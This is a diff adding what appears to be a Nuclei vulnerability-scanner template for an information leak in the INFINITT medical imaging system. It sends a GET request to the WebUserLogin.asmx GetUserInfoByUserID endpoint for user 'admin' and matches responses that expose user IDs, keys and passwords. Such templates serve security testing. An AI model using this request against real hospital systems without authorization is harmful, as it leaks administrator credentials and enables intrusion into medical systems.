@@ -1,0 +1,30 @@
+id: infinitt-webuserlogin-info-leak
+
+info:
+  name: INFINITT WebUserLogin - Info Leak
+  author: qwtd
+  severity: high
+  description: |
+    英飞达医学WebUserLogin.asmx信息泄露
+  reference:
+    - https://wiki.wy876.cn/#/./%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%8C%BB%E5%AD%A6WebUserLogin.asmx%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2
+  tags: 英飞达医学
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin"
+      
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "/USER_KEY"
+          - "/USERID"
+          - "/PASSWORD"
+          - "/USER_NAME"
+        condition: and
+
+      - type: status
+        status:
+          - 200
